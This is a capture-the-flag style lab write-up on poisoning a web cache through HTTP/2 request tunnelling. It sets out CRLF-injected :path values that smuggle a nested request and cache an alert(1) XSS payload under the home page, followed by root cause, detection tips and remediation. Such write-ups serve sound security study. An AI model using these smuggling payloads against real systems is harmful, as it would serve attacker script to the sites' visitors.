# PS‑012 — Web cache poisoning via HTTP/2 request tunnelling

**Date / Analyst:** 2025-10-03 — Christopher Araque
**Target:** PortSwigger lab (H2→H1 downgrade; `:path` CRLF)
**Impact:** Cache entry for **/** poisoned to reflect **HTML/JS** → victim executes `alert(1)`
**Status:** Solved

## Summary
- The front end **downgrades HTTP/2 to HTTP/1.1** and doesn’t consistently sanitize the **`:path`** pseudo‑header. By injecting **CRLF** into `:path`, I split the request and **tunnelled** a second HTTP/1.1 request. The cache stored the **tunnelled response body** under the first request’s key (**/**). Using `/resources?<script>alert(1)</script>…` as a gadget and padding the nested response to exceed the normal home page `Content‑Length`, I served executable JS from `/`, which fired for the victim.


## Repro (minimal)
1. **HTTP/2** in Repeater. Prove `:path` injection:
    ```
    :path =
    /?cachebuster=1 HTTP/1.1\r\n
    Host: <lab-host>.web-security-academy.net\r\n
    \r\n
    GET /post?postId=1 HTTP/1.1\r\n
    Foo: bar
    ```

    Result: nested `/post` response appears in the body.

2. Note **GET /** `Content-Length` from a clean response (needed for padding).
3. Build XSS via `/resources` with padding so the **nested** body **>** home page `Content-Length`:
    ```
    :path =
    /?cachebuster=3 HTTP/1.1\r\n
    Host: <lab-host>.web-security-academy.net\r\n
    \r\n
    GET /resources?<script>alert(1)</script>AAAA...(pad > home CL)... HTTP/1.1\r\n
    Foo: bar
    ```
    Result: nested response shows `Location: /resources/?<script>alert(1)</script>` and your `A…` padding.

4. **Commit the poison**:
- Send `:path = /?cachebuster=3` → cached.
- Repeat the same technique against the **home page** key:
  ```
  :path =
  / HTTP/1.1\r\n
  Host: <lab-host>.web-security-academy.net\r\n
  \r\n
  GET /resources?<script>alert(1)</script>AAAA...(pad > home CL)... HTTP/1.1\r\n
  Foo: bar
  ```
  Then send `:path = /` every few seconds until the victim fetches it. Browser shows the **Solved** banner when the alert fires.
## Evidence
- Screenshot: [ps-012-screenshot.png](../../evidence/ps-access/ps-012-screenshot.png)
- Request/response & PoC request (final `:path` value for `/`): [ps-012-request.txt](../../evidence/ps-access/ps-012-request.txt)

## Root cause
- **Unsafe H2→H1 translation** allows **CRLF** inside `:path` → **request tunnelling**.
- Cache stores the **tunnelled** body under the first request’s key (**/**).



## Impact
- Stored XSS served from the home page to any visitor.

## Detection tips
- Reject/alert on CTLs/CRLF in HTTP/2 pseudo‑headers.

- Detect HEAD responses whose bodies contain nested `HTTP/1.1` blocks.

- Compare cache keys vs. origin logs for bodies that don’t match paths.


## Remediation
- Enforce RFC‑compliant header parsing; **disallow CR/LF in `:path`**.

- Keep HTTP/2 end‑to‑end, or use a translator that canonicalizes and re‑encodes requests.

- Normalize cache keys; avoid caching HEAD bodies; HTML‑escape redirect targets.


## Appendix: raw PoC (from lab run)
Outer: HTTP/2 **HEAD**; cache key `/` (or `/?cachebuster=N` for testing).
Injected **`:path` value** (final variant used):
    ```
    / HTTP/1.1\r\n
    Host: <lab-host>.web-security-academy.net\r\n
    \r\n
    GET /resources?<script>alert(1)</script>AAAA...(pad > home CL)... HTTP/1.1\r\n
    Foo: bar
    ```



